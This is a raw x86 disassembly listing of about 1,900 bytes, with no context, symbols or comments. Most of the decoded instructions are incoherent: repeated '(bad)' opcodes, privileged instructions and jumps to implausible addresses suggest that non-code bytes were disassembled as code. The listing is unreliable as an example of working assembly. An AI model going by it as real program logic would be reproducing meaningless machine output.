  43376d:	xlat   BYTE PTR ds:[ebx]
  43376e:	inc    ebp
  43376f:	mov    edi,DWORD PTR [ecx]
  433771:	push   eax
  433772:	pushf  
  433773:	in     eax,0x8b
  433775:	add    ah,ch
  433777:	(bad)  
  433778:	push   ecx
  433779:	add    BYTE PTR [ecx+0x66],dl
  43377c:	add    eax,0x3872cb
  433781:	add    BYTE PTR [ebp+0x66],al
  433784:	(bad)  
  433785:	retf   
  433786:	lock cmp al,BYTE PTR [ebp+0x4566f800]
  43378d:	retf   
  43378e:	cmp    cl,al
  433790:	pushf  
  433791:	jge    0x43375a
  433793:	aaa    
  433794:	cld    
  433795:	pushf  
  433796:	test   DWORD PTR [edi-0x8],ebx
  433799:	je     0x4337e0
  43379b:	xor    esi,DWORD PTR ds:0x7020840
  4337a1:	ror    BYTE PTR [ebp-0x37],0x8d
  4337a5:	push   ebp
  4337a6:	add    esp,ebp
  4337a8:	jb     0x433735
  4337aa:	add    BYTE PTR [eax],cl
  4337ac:	dec    ebp
  4337ad:	mov    bh,0x81
  4337af:	push   esi
  4337b0:	push   ecx
  4337b1:	adc    DWORD PTR [ecx-0x3b],0x3899ff81
  4337b8:	xor    al,BYTE PTR [eax]
  4337ba:	mov    edx,DWORD PTR [edi+0x10]
  4337bd:	(bad)  
  4337be:	scas   eax,DWORD PTR es:[edi]
  4337bf:	cmp    bh,BYTE PTR [ebx]
  4337c1:	add    BYTE PTR [edi],cl
  4337c3:	mov    ebp,ebp
  4337c5:	cld    
  4337c6:	add    BYTE PTR [ebx],bh
  4337c8:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4337cc:	dec    ebp
  4337cd:	or     BYTE PTR [ebx],ch
  4337cf:	ret    0x458b
  4337d2:	lock jmp 0x4337c6
  4337d5:	mov    ecx,DWORD PTR [eax]
  4337d7:	or     BYTE PTR [edi],al
  4337d9:	mov    ecx,eax
  4337db:	xor    DWORD PTR [edx+0x2],0x0
  4337df:	mov    bh,0xc1
  4337e1:	adc    BYTE PTR [eax],dh
  4337e3:	iret   
  4337e4:	inc    ebp
  4337e5:	mov    DWORD PTR [ebx],0x4dfff8c5
  4337eb:	inc    BYTE PTR [ebx]
  4337ed:	cmp    bh,al
  4337ef:	add    BYTE PTR [ecx],dl
  4337f1:	data16 adc al,bh
  4337f4:	dec    ecx
  4337f5:	fisttp WORD PTR [ecx+0x456604c0]
  4337fb:	add    dh,BYTE PTR ds:0x75e0845
  433801:	ret    0x4d
  433804:	lea    ecx,[ebx+0x18728301]
  43380a:	add    BYTE PTR [ebp+0x45],al
  43380d:	ss jmp 0x10a38af
  433813:	call   0xf8cebd5d
  433818:	clc    
  433819:	inc    ebp
  43381a:	shl    DWORD PTR ds:0x781084d,0x51
  433821:	cdq    
  433822:	push   ecx
  433823:	xor    al,BYTE PTR [ecx+0x32f89989]
  433829:	inc    ebp
  43382a:	cmp    edi,DWORD PTR [esi]
  43382c:	jbe    0x4337ca
  43382e:	mov    eax,edi
  433830:	or     ah,dh
  433832:	inc    ebp
  433833:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  433839:	cmp    BYTE PTR [ebx-0x74747664],cl
  43383f:	in     al,dx
  433840:	hlt    
  433841:	push   ecx
  433842:	push   ecx
  433843:	push   ecx
  433844:	push   ecx
  433845:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  43384b:	cdq    
  43384c:	cdq    
  43384d:	xor    dh,BYTE PTR [edx]
  43384f:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  433855:	or     BYTE PTR [ebp+0x7],al
  433858:	mov    eax,ecx
  43385a:	clc    
  43385b:	jb     0x43381e
  43385d:	add    BYTE PTR [ebp+0x55],cl
  433860:	or     DWORD PTR [edi],0xc251d151
  433866:	add    DWORD PTR [ebx+0x320099],0x8b76453b
  433870:	mov    edi,eax
  433872:	or     cl,al
  433874:	inc    ebp
  433875:	dec    ebp
  433876:	mov    eax,DWORD PTR [ecx+0x514d510c]
  43387c:	or     WORD PTR [ecx],0x8999
  433881:	xor    cl,BYTE PTR [ebx+0x5176fc3b]
  433887:	mov    edx,DWORD PTR [ecx+0x8]
  43388a:	mov    eax,DWORD PTR [ebp-0x8]
  43388d:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb267]
  433894:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  43389a:	inc    ebp
  43389b:	dec    eax
  43389c:	add    ecx,DWORD PTR [ebx+0x514df0f8]
  4338a2:	add    edx,DWORD PTR [ecx-0x8]
  4338a5:	mov    ecx,DWORD PTR [ecx]
  4338a7:	clc    
  4338a8:	or     BYTE PTR [ebp+eax*2+0x45324099],al
  4338af:	mov    ecx,ebp
  4338b1:	clc    
  4338b2:	(bad)  
  4338b3:	popf   
  4338b4:	inc    DWORD PTR [eax]
  4338b6:	ret    0x8b
  4338b9:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4338bf:	mov    edi,esp
  4338c1:	hlt    
  4338c2:	test   ecx,esi
  4338c4:	clc    
  4338c5:	or     BYTE PTR [ebp+0x7],al
  4338c8:	cmp    ecx,eax
  4338ca:	pushf  
  4338cb:	jb     0x433900
  4338cd:	add    BYTE PTR [eax-0x3f],al
  4338d0:	inc    eax
  4338d1:	daa    
  4338d2:	inc    ebp
  4338d3:	inc    ebp
  4338d4:	xor    eax,0x7f80803
  4338d9:	dec    ebp
  4338da:	cdq    
  4338db:	add    esi,DWORD PTR [edx]
  4338dd:	clc    
  4338de:	cmp    DWORD PTR [ecx],ecx
  4338e0:	or     al,0x8
  4338e2:	add    al,BYTE PTR [ebp+0x2c]
  4338e5:	xor    eax,0x7350845
  4338ea:	or     BYTE PTR [ebp+0x7],cl
  4338ed:	lea    ebx,[ecx-0x748dcdff]
  4338f3:	add    BYTE PTR [eax*2-0x74b21438],cl
  4338fa:	mov    edx,DWORD PTR [eax]
  4338fc:	cld    
  4338fd:	dec    ebp
  4338fe:	push   ecx
  4338ff:	sub    edx,DWORD PTR [ecx-0x75]
  433902:	add    eax,0xf172fc
  433907:	or     BYTE PTR [ebp+0x7],cl
  43390a:	add    eax,ecx
  43390c:	or     al,0x72
  43390e:	add    DWORD PTR [eax],eax
  433910:	mov    ebx,0x29c2c1
  433915:	inc    ebp
  433916:	mov    eax,DWORD PTR [ebx]
  433918:	cmp    eax,0x3004d1c
  43391e:	xbegin 0x66c8c518
  433924:	clc    
  433925:	or     BYTE PTR [ebp+0x45],al
  433928:	cmp    DWORD PTR ds:0x78b089c,esi
  43392e:	adc    BYTE PTR [ebp+0x45],cl
  433931:	lea    eax,[ebp+0x33727501]
  433937:	add    cl,ch
  433939:	inc    ebp
  43393a:	add    bl,ch
  43393c:	add    BYTE PTR [ebx+0x45850845],cl
  433942:	je     0x4338cf
  433944:	push   ebx
  433945:	or     al,0x85
  433947:	dec    ebp
  433948:	std    
  433949:	mov    bh,bh
  43394b:	mov    BYTE PTR [ebp-0x75],al
  43394e:	mov    edi,eax
  433950:	or     al,0x89
  433952:	inc    ebp
  433953:	clc    
  433954:	mov    esp,esp
  433956:	hlt    
  433957:	call   DWORD PTR [edi-0x37]
  43395a:	push   ecx
  43395b:	or     al,0x51
  43395d:	push   ebp
  43395e:	xor    ebp,esp
  433960:	mov    esi,0x457251
  433965:	ss (bad) 
  433967:	pushf  
  433968:	inc    ebp
  433969:	(bad)  
  43396a:	mov    edi,eax
  43396c:	or     al,0x85
  43396e:	add    al,bh
  433970:	inc    eax
  433972:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  433976:	or     ah,bh
  433978:	inc    eax
  433979:	push   ecx
  43397a:	jmp    0x4339cd
  43397c:	mov    eax,DWORD PTR ds:0xe8720c
  433982:	mov    DWORD PTR [ebp-0x8],eax
  433985:	jne    0x4339cc
  433987:	jmp    0x433914
  433989:	mov    ebp,DWORD PTR [eax]
  43398b:	clc    
  43398c:	retf   0xff51
  43398f:	push   ecx
  433990:	mov    DWORD PTR ds:0x757210,eax
  433996:	mov    ecx,DWORD PTR [ebp-0x4]
  433999:	sub    esp,DWORD PTR [ebx-0x77]
  43399c:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4339a3:	or     ah,bh
  4339a5:	pop    es
  4339a6:	ds cdq 
  4339a8:	push   DWORD PTR [edx]
  4339aa:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4339b0:	(bad)  
  4339b1:	mov    bh,bh
  4339b3:	jmp    0x4339a1
  4339b5:	leave  
  4339b6:	jne    0x4339c0
  4339b8:	call   0x303312
  4339bd:	in     al,dx
  4339be:	dec    ebp
  4339bf:	add    dh,BYTE PTR [ebx]
  4339c1:	add    BYTE PTR [ebx],al
  4339c3:	inc    ebp
  4339c4:	cmp    esi,DWORD PTR [esi]
  4339c6:	je     0x433964
  4339c8:	mov    eax,edi
  4339ca:	or     al,0xf0
  4339cc:	add    BYTE PTR [ebp+0x458bf845],al
  4339d2:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  4339d8:	adc    al,0x7
  4339da:	enter  0x9fc0,0xa5
  4339de:	rol    BYTE PTR [eax],0x5e
  4339e1:	mov    ecx,ecx
  4339e3:	or     al,0xc
  4339e5:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  4339ec:	jmp    0x4339ed
  4339ee:	push   ebp
  4339ef:	mov    esp,ebp
  4339f1:	cld    
  4339f2:	inc    ebp
  4339f3:	inc    ebp
  4339f4:	or     DWORD PTR [ecx+0x457dec10],0x0
  4339fb:	push   esi
  4339fc:	push   esi
  4339fd:	mov    edi,0x7af080f
  433a02:	add    bh,al
  433a04:	test   DWORD PTR [ecx+0x3a7320f],ebx
  433a0a:	add    BYTE PTR [ecx+0x4540100f],cl
  433a10:	mov    ebp,eax
  433a12:	mov    ebp,edi
  433a14:	lock call edx
  433a17:	fcom   DWORD PTR [ebp+0x45]
  433a1a:	mov    eax,0x148a8b
  433a1f:	push   ecx
  433a20:	enter  0xc145,0x83
  433a24:	cmp    cl,BYTE PTR [eax]
  433a26:	add    BYTE PTR [ebp+0x4d],al
  433a29:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  433a2f:	call   0xffa3359e
  433a34:	cmp    eax,DWORD PTR [ebp-0xc]
  433a37:	jmp    DWORD PTR [eax+edx*1-0x4e]
  433a3b:	push   ebp
  433a3c:	(bad)
  433a3f:	std    
  433a40:	lock push DWORD PTR [edi+0x5d08fcdb]
  433a47:	inc    ebp
  433a48:	(bad)  
  433a49:	call   0xff7d36d9
  433a4e:	add    al,BYTE PTR [ebp+0x37]
  433a51:	xor    esi,DWORD PTR [edi+0x4f50bf03]
  433a57:	jne    0x433a59
  433a59:	(bad)  
  433a5a:	cmp    edi,esp
  433a5c:	jne    0x433a8f
  433a5e:	mov    edi,edi
  433a60:	or     BYTE PTR [ebx-0x307f0b49],cl
  433a66:	pop    ds
  433a67:	into   
  433a68:	je     0x433a2b
  433a6a:	mov    ebx,DWORD PTR [esi]
  433a6c:	or     BYTE PTR [ebp-0x49],al
  433a6f:	mov    esp,DWORD PTR [esi-0x77]
  433a72:	mov    esi,0xfe451f0c
  433a77:	mov    eax,DWORD PTR [eax]
  433a79:	or     al,0x66
  433a7b:	sar    bl,0x3b
  433a7e:	xor    esi,DWORD PTR [ebp+0x66]
  433a81:	xor    ecx,edi
  433a83:	pop    edi
  433a84:	adc    bl,BYTE PTR [ebx+0x7e]
  433a87:	ret    0xff
  433a8a:	cld    
  433a8b:	inc    ebp
  433a8c:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  433a92:	cld    
  433a93:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  433a9a:	push   0xffffff83
  433a9c:	pop    edi
  433a9d:	or     BYTE PTR [ebp+0x53],dh
  433aa0:	xorps  xmm1,xmm2
  433aa3:	test   BYTE PTR [eax+eax*1],bh
  433aa6:	add    BYTE PTR [eax],al
  433aa8:	adc    eax,eax
  433aaa:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  433ab2:	jmp    DWORD PTR [eax]
  433ab4:	ror    al,0x5e
  433ab7:	inc    ebp
  433ab8:	leave  
  433ab9:	xor    ecx,DWORD PTR [eax]
  433abb:	and    DWORD PTR [ebx-0x3ec70708],ecx
  433ac1:	add    ch,al
  433ac3:	xor    edi,edi
  433ac5:	xor    DWORD PTR [ebx],0x660033fe
  433acb:	mov    DWORD PTR [ebp-0xc],ecx
  433ace:	pcmpgtw mm0,mm0
  433ad1:	add    dl,ah
  433ad3:	leave  
  433ad4:	mov    edi,DWORD PTR [eax-0x7d]
  433ad7:	push   ax
  433ad9:	dec    ebp
  433ada:	mov    esi,DWORD PTR [ebx-0x75]
  433add:	lea    ebp,[eax-0x7c00fffe]
  433ae3:	xor    eax,DWORD PTR [eax]
  433ae5:	sysret 
  433ae7:	dec    ebp
  433ae8:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  433aef:	push   WORD PTR [ecx+0x8]
  433af3:	jne    0x433ab6
  433af5:	ud0    ecx,DWORD PTR [ecx]
  433af8:	mov    edi,DWORD PTR [edx]
  433afa:	lods   al,BYTE PTR ds:[esi]
  433afb:	add    BYTE PTR [eax],al
  433afd:	data16 (bad) 
  433aff:	iret   
  433b00:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  433b07:	cli    
  433b08:	inc    ebp
  433b09:	cmp    al,0x8d
  433b0b:	add    BYTE PTR [esi+0x2d],ah
  433b0e:	inc    ebp
  433b0f:	pop    ebp
  433b10:	lea    ecx,[edi]
  433b12:	mov    dl,bh
  433b14:	add    BYTE PTR [edi],cl
  433b16:	mov    DWORD PTR [eax+eax*8],edi
  433b19:	mov    ebx,0x3a87
  433b1e:	add    BYTE PTR [ebx],ch
  433b20:	inc    ebp
  433b21:	data16 (bad) 
  433b23:	clc    
  433b24:	int3   
  433b25:	cmp    eax,DWORD PTR [eax]
  433b27:	je     0x433ab2
  433b29:	push   0xffffffc8
  433b2b:	pop    edi
  433b2c:	xchg   DWORD PTR [ebp+0x0],eax
  433b2f:	data16 add BYTE PTR [ebp+0x45],cl
  433b33:	lea    cx,[ebp+0x10]
  433b37:	jb     0x433b39
  433b39:	jmp    0x433ac4
  433b3b:	call   eax
  433b3d:	clc    
  433b3e:	xchg   DWORD PTR [edi+0x1],edi
  433b41:	mov    eax,DWORD PTR [eax]
  433b43:	or     BYTE PTR [ebp-0x49],al
  433b46:	lea    eax,[eax+0x74003154]
  433b4c:	push   edi
  433b4d:	inc    edx
  433b4e:	jge    0x433b4f
  433b50:	mov    DWORD PTR [edi],ecx
  433b52:	fdiv   DWORD PTR [edi-0x6]
  433b55:	inc    DWORD PTR [eax]
  433b57:	xor    edx,DWORD PTR [eax+0x5f]
  433b5a:	xchg   DWORD PTR [ebx+0x1],ebx
  433b5d:	ret    0x0
  433b60:	xor    BYTE PTR [ebp-0x51],cl
  433b63:	cmp    edi,0xf0ff8902
  433b69:	data16 ror al,0x84
  433b6d:	rol    BYTE PTR [eax],0x3b
  433b70:	add    al,dh
  433b72:	dec    eax
  433b73:	xchg   esp,eax
  433b74:	push   ebx
  433b75:	jmp    0x433b02
  433b77:	push   ebp
  433b78:	add    esp,ebp
  433b7a:	add    ebp,esp
  433b7c:	mov    edx,DWORD PTR [edi+0x24]
  433b7f:	clc    
  433b80:	dec    esi
  433b81:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  433b87:	cmp    BYTE PTR [ebx],al
  433b89:	jne    0x433b14
  433b8b:	xor    esp,eax
  433b8d:	jmp    0x463d10
  433b92:	add    ebp,DWORD PTR [ecx+ecx*4]
  433b95:	jne    0x433b8b
  433b97:	call   0xffcd38f1
  433b9c:	clc    
  433b9d:	xchg   edi,eax
  433b9e:	sti    
  433b9f:	add    DWORD PTR [ebx],eax
  433ba1:	add    BYTE PTR [ebp+0x47],bl
  433ba4:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  433baa:	pop    ebp
  433bab:	mov    DWORD PTR [esi-0x48],esi
  433bae:	jmp    0x433bf7
  433bb0:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  433bb6:	(bad)  
  433bb8:	cmp    al,0x0
  433bba:	cmp    eax,DWORD PTR [ebp+0x18]
  433bbd:	lea    ebx,[ebp-0x56]
  433bc0:	jle    0x433bc2
  433bc2:	jae    0x433b4d
  433bc4:	mov    eax,esp
  433bc6:	call   0xb900:0x8b005587
  433bcd:	inc    ebp
  433bce:	push   ebp
  433bcf:	lea    ecx,[ebp-0x27ff4f12]
  433bd5:	mov    eax,edi
  433bd7:	int3   
  433bd8:	push   ebp
  433bd9:	xchg   edi,eax
  433bdb:	add    esp,ebp
  433bdd:	add    BYTE PTR [eax],al
  433bdf:	inc    ebp
  433be0:	add    BYTE PTR [ebp+0x8b3255],cl
  433be6:	cld    
  433be7:	mov    DWORD PTR [edx],edi
  433be9:	aam    0x75
  433beb:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  433bf1:	mov    DWORD PTR [ebx-0x50],edx
  433bf4:	test   BYTE PTR [ebp-0x1],0xe8
  433bf8:	mov    eax,DWORD PTR [eax]
  433bfa:	hlt    
  433bfb:	add    al,al
  433bfd:	mov    eax,DWORD PTR ds:0x890045a8
  433c03:	dec    DWORD PTR [ebx+0x45fdf0e8]
  433c09:	inc    DWORD PTR [eax*2+0xf75854d]
  433c10:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  433c16:	call   0x72999957
  433c1b:	je     0x433c7b
  433c1d:	js     0x433c7e
  433c1f:	lock ret 0x7e
  433c23:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  433c29:	mov    edi,edi
  433c2b:	sbb    al,bl
  433c2d:	clc    
  433c2e:	add    BYTE PTR [ebp-0x73],bh
  433c31:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  433c37:	ror    BYTE PTR [eax],1
  433c39:	dec    ebp
  433c3a:	xchg   ebp,eax
  433c3b:	mov    edi,edi
  433c3d:	in     al,0x8b
  433c3f:	jge    0x433bca
  433c41:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  433c47:	clc    
  433c48:	pop    esi
  433c49:	fist   DWORD PTR [ebp+0x5d398b5d]
  433c4f:	clc    
  433c50:	add    al,0x6e
  433c52:	mov    eax,DWORD PTR [ebx]
  433c54:	mov    BYTE PTR [ebp+0x0],dl
  433c57:	mov    edx,DWORD PTR [ebx-0x20]
  433c5a:	adc    esi,DWORD PTR [edi+0x5e005f38]
  433c60:	add    eax,0x3b3a73
  433c65:	adc    al,0x89
  433c67:	pop    eax
  433c68:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  433c6c:	ret    0xf08
  433c6f:	cmp    al,0x2
  433c71:	mov    DWORD PTR [edx],edi
  433c73:	cld    
  433c74:	add    BYTE PTR [ebp+0x66],dl
  433c77:	add    eax,ebx
  433c79:	add    esp,eax
  433c7b:	sub    eax,eax
  433c7d:	or     BYTE PTR [ecx-0x77f474bb],cl
  433c83:	add    BYTE PTR [eax],al
  433c85:	mov    DWORD PTR [ebx-0x24],ebx
  433c88:	push   edi
  433c89:	push   ebp
  433c8a:	clc    
  433c8b:	add    DWORD PTR [esi+0x1b0100],0x45
  433c92:	out    0xff,eax
  433c94:	add    edx,DWORD PTR [eax]
  433c96:	jmp    0x433c80
  433c98:	cmp    ch,0x44
  433c9b:	(bad)  
  433c9c:	jmp    0x40c8c4ee
  433ca1:	je     0x433c2d
  433ca3:	mov    eax,DWORD PTR [eax-0x10c78104]
  433ca9:	inc    ebp
  433caa:	add    BYTE PTR [ebx-0x770375],al
  433cb0:	add    ah,ch
  433cb2:	add    edx,esp
  433cb4:	pop    edi
  433cb5:	pop    ebp
  433cb6:	push   ebp
  433cb7:	inc    ebx
  433cb8:	in     al,dx
  433cb9:	pop    ebp
  433cba:	in     al,dx
  433cbb:	cmp    edx,DWORD PTR [edi-0x8]
  433cbe:	ss xchg esp,eax
  433cc0:	pushf  
  433cc1:	pop    ebx
  433cc2:	mov    ecx,ecx
  433cc4:	call   0x899883cd
  433cc9:	in     al,dx
  433cca:	in     al,0x45
  433ccc:	dec    ebp
  433ccd:	push   esi
  433cce:	test   DWORD PTR [eax+0xfb010f],esi
  433cd4:	add    BYTE PTR [eax+0xc018b],dh
  433cda:	leave  
  433cdb:	inc    ebp
  433cdc:	test   al,ch
  433cde:	add    dh,bh
  433ce0:	add    bh,bh
  433ce2:	dec    ebp
  433ce3:	push   cs
  433ce4:	mov    DWORD PTR [ecx],eax
  433ce6:	hlt    
  433ce7:	push   es
  433ce8:	dec    ebp
  433ce9:	leave  
  433cea:	mov    DWORD PTR [eax],ecx
  433cec:	clc    
  433ced:	cmovge eax,ecx
  433cf0:	mov    ecx,0x85c2f0
  433cf6:	clc    
  433cf7:	pop    DWORD PTR [ebp+0x1]
  433cfa:	push   ebx
  433cfb:	add    BYTE PTR [ebp-0x15],bh
  433cfe:	push   esi
  433cff:	xor    eax,0x898a45
  433d04:	cld    
  433d05:	inc    BYTE PTR [ebp+0x0]
  433d08:	cmp    BYTE PTR [esi-0x64],ah
  433d0b:	add    DWORD PTR [esi+0x78308c1],edi
  433d11:	add    ah,BYTE PTR [edi-0x49]
  433d14:	int    0xbb
  433d16:	mov    ecx,DWORD PTR [edi+0xc]
  433d19:	add    dh,al
  433d1b:	cmp    ecx,ebx
  433d1d:	jne    0x433ce7
  433d1f:	xor    ecx,DWORD PTR [ebp+0x66]
  433d22:	jmp    0xca3d28
  433d27:	add    DWORD PTR [ebp+0x0],eax
  433d2a:	mov    eax,ebx
  433d2c:	or     al,0x8b
  433d2e:	(bad)  
  433d2f:	mov    ecx,esi
  433d31:	mov    BYTE PTR [eax+eax*1+0x664c132],cl
  433d38:	mov    eax,edi
  433d3a:	or     BYTE PTR [edx],cl
  433d3c:	shl    cl,cl
  433d3e:	icebp  
  433d3f:	add    BYTE PTR [ebp+0x3a],0x8b
  433d43:	or     BYTE PTR [edx+eax*2],cl
  433d46:	(bad)  
  433d47:	or     cl,dh
  433d49:	stc    
  433d4a:	shl    DWORD PTR [ebp-0x30],0xc6
  433d4e:	xor    al,0x0
  433d50:	inc    ebp
  433d51:	xchg   BYTE PTR [ebx],al
  433d53:	add    esp,edi
  433d55:	add    BYTE PTR [ebp-0x39],cl
  433d58:	mov    al,bl
  433d5a:	test   DWORD PTR [ebx+0x1c348375],ecx
  433d60:	sub    al,0xbf
  433d62:	jmp    0x433ce9
  433d64:	mov    edi,eax
  433d66:	lock jge 0x433d5a
  433d69:	lea    esi,[edx-0x74bad5fd]
  433d6f:	mov    ebp,esp
  433d71:	or     cl,dh
  433d73:	leave  
  433d74:	add    al,BYTE PTR [eax+eax*4-0x37ff9900]
  433d7b:	dec    ebp
  433d7c:	dec    ebp
  433d7d:	test   DWORD PTR [ebx],eax
  433d7f:	paddb  mm6,mm0
  433d82:	add    DWORD PTR [eax],eax
  433d84:	dec    ebp
  433d85:	mov    ecx,DWORD PTR [ebx-0x66b217f0]
  433d8b:	mov    esi,DWORD PTR [edx]
  433d8d:	or     al,0x2b
  433d8f:	dec    ebp
  433d90:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  433d96:	mov    esp,edx
  433d98:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  433d9f:	mov    DWORD PTR [ebx],ebp
  433da1:	call   0xc76c6d1
  433da6:	mov    DWORD PTR [ebp+0x10],ecx
  433da9:	(bad)  
  433daa:	push   0x8b85ff10
  433daf:	clc    
  433db0:	or     al,0x51
  433db2:	(bad)  
  433db3:	push   ecx
  433db4:	retf   
  433db5:	mov    ebx,0xff4d8dc8
  433dba:	mov    DWORD PTR [ebp+0x8],eax
  433dbd:	xor    eax,DWORD PTR [ebp-0x75]
  433dc0:	cmp    ebp,DWORD PTR [ebx]
  433dc2:	lsl    ebx,WORD PTR [edi-0x8]
  433dc6:	call   DWORD PTR [ebx-0x741bff75]
  433dcc:	(bad)  
  433dcd:	or     al,0x5b
  433dcf:	dec    ebp
  433dd0:	or     BYTE PTR [ebx],dh
  433dd2:	inc    ebp
  433dd3:	xor    esi,DWORD PTR ds:0x708088d
  433dd9:	in     eax,0x99
  433ddb:	add    BYTE PTR [edx],dh
  433ddd:	inc    ebp
  433dde:	pop    edi
  433ddf:	xor    eax,edx
  433de1:	test   DWORD PTR [eax],0x81108b8b
  433de7:	dec    ebp
  433de8:	sub    al,0x33
  433dea:	add    BYTE PTR [ebx],dh
  433dec:	push   esi
  433ded:	sub    ecx,DWORD PTR [ebx-0x768accc5]
  433df3:	mov    edi,eax
  433df5:	or     BYTE PTR [ebp+0x45],al
  433df8:	mov    DWORD PTR [ebx+0x45f4ec],ecx
  433dfe:	ss leave 
  433e00:	pushf  
  433e01:	push   es
  433e02:	mov    DWORD PTR [esp+edi*8+0x3a],0x4df81785
  433e0a:	inc    ebp
  433e0b:	cmp    BYTE PTR [esi],0x51
  433e0e:	pushf  
  433e0f:	addr16 (bad) 
  433e11:	shl    esp,1
  433e13:	dec    ebp
  433e14:	xchg   BYTE PTR [eax-0x3dbaae08],al
  433e1a:	(bad)  
  433e1b:	jmp    0x8c0b10f7
  433e20:	aam    0x8
  433e22:	test   DWORD PTR [ebp-0x8],ecx
  433e25:	mov    BYTE PTR [ebp-0x75],al
  433e28:	or     BYTE PTR [eax],cl
  433e2a:	add    BYTE PTR [ebp-0x75],dl
  433e2d:	mov    eax,0xfc728b
  433e32:	dec    ebp
  433e33:	enter  0xceba,0x8
  433e37:	retf   0x1807
  433e3a:	ret    0x994d
  433e3d:	mov    esi,DWORD PTR [edx]
  433e3f:	or     al,0x33
  433e41:	into   
  433e42:	add    edx,esi
  433e44:	add    ecx,edx
  433e46:	bswap  eax
  433e48:	ror    esi,0x98
  433e4b:	dec    ebp
  433e4c:	add    cl,ch
  433e4e:	mov    edi,edi
  433e50:	hlt    
  433e51:	inc    esi
  433e53:	inc    ebp
  433e54:	ret    0x4533
  433e57:	mov    ecx,DWORD PTR [ebx+0x4d03fc2b]
  433e5d:	or     BYTE PTR [ebx],dh
  433e5f:	dec    ebp
  433e60:	xor    ecx,DWORD PTR [ebx-0x38fceffd]
  433e66:	jne    0xff8d3e2d
  433e6c:	inc    ebp
  433e6d:	inc    ebp
  433e6e:	mov    esi,DWORD PTR [ebx]
  433e70:	clc    
  433e71:	pop    esi
  433e72:	ret    0xcaeb
  433e75:	mov    eax,esi
  433e77:	call   0x5204904a
  433e7c:	dec    ebp
  433e7d:	add    eax,0xf8728b
  433e82:	adc    eax,0xce0ccac9
  433e87:	push   ebp
  433e88:	ret    0xc6ec
  433e8b:	in     al,dx
  433e8c:	call   0x33438b95
  433e91:	push   edi
  433e92:	add    edi,eax
  433e94:	xor    eax,eax
  433e96:	jmp    0x433edd
  433e98:	xor    ecx,DWORD PTR [ecx+0x4503f433]
  433e9e:	add    eax,edi
  433ea0:	shr    eax,cl
  433ea2:	mov    DWORD PTR [ebp+0x4545f8f8],eax
  433ea8:	mov    edi,DWORD PTR [ecx]
  433eaa:	in     al,dx
  433eab:	pushf  
  433eac:	ret    0x84c7
  433eaf:	fcomp  DWORD PTR [ecx-0x7607cd7b]
  433eb5:	inc    ebp
  433eb6:	in     al,dx
  433eb7:	ss inc ebp
  433eb9:	pushf  
  433eba:	mov    eax,edi
  433ebc:	cld    
  433ebd:	fmul   st(2),st
  433ebf:	sbb    dl,al
  433ec1:	jmp    0x9c3b:0x374d45c1
  433ec8:	jbe    0x433e91
  433eca:	mov    esp,eax
  433ecc:	clc    
  433ecd:	add    BYTE PTR [ebp+0x0],cl
  433ed0:	mov    ecx,ecx
  433ed2:	lea    eax,[ebp-0x5]
  433ed5:	mov    edi,edi
  433ed7:	call   0x51ce9021
  433edc:	hlt    
  433edd:	xor    eax,edx
  433edf:	mov    esi,0x997284
  433ee4:	xor    cl,dl
  433ee6:	mov    esi,eax
  433ee8:	hlt    
  433ee9:	into   
  433eea:	inc    ebp
  433eeb:	scas   eax,DWORD PTR es:[edi]
  433eec:	mov    ebp,ecx
  433eee:	cld    
  433eef:	add    dl,cl
  433ef1:	add    dl,al
  433ef3:	inc    ebp
  433ef4:	shr    DWORD PTR [ebx],0x4d
  433ef7:	xor    edi,DWORD PTR [ebx]
  433ef9:	mov    DWORD PTR [edi],ecx
  433efb:	clc    
  433efc:	dec    esi
  433efd:	inc    ebp
  433efe:	dec    DWORD PTR [ebx-0x3d2b1775]
  433f04:	ret    0xc6ca
  433f07:	mov    BYTE PTR [ebp-0x32],0x53
  433f0b:	scas   eax,DWORD PTR es:[edi]
  433f0c:	inc    ebp
  433f0d:	jmp    0x433f46
  433f0f:	mov    ebx,DWORD PTR [esp+edi*8+0x335b4d8b]
  433f16:	pop    ebx
  433f17:	xor    ecx,DWORD PTR [ebp+0x3]
  433f1a:	mov    eax,DWORD PTR [ebx]
  433f1c:	clc    
  433f1d:	test   edx,ecx
  433f1f:	mov    ecx,esi
  433f21:	cld    
  433f22:	call   0x8ab7846c
  433f27:	xor    ecx,DWORD PTR [eax+0x4533f303]
  433f2d:	add    ecx,DWORD PTR [ebx-0x4974072d]
  433f33:	fdiv   QWORD PTR [ebx]
  433f35:	retf   0xce89
  433f38:	in     al,0xc1
  433f3a:	inc    ebp
  433f3b:	or     cl,BYTE PTR [ebx-0x3d3d1b36]
  433f41:	into   
  433f42:	mov    dh,0xc1
  433f45:	call   0x8c1784ce
  433f4a:	(bad)  
  433f4b:	cld    
  433f4c:	mov    ecx,DWORD PTR [ebp-0x14]
  433f4f:	xor    eax,ecx
  433f51:	lea    eax,[ebp+0x8]
  433f54:	mov    esi,DWORD PTR [edx-0x4]
  433f57:	add    dl,al
  433f59:	inc    ebp
  433f5a:	mov    esp,0x32d8998b
  433f5f:	dec    ebp
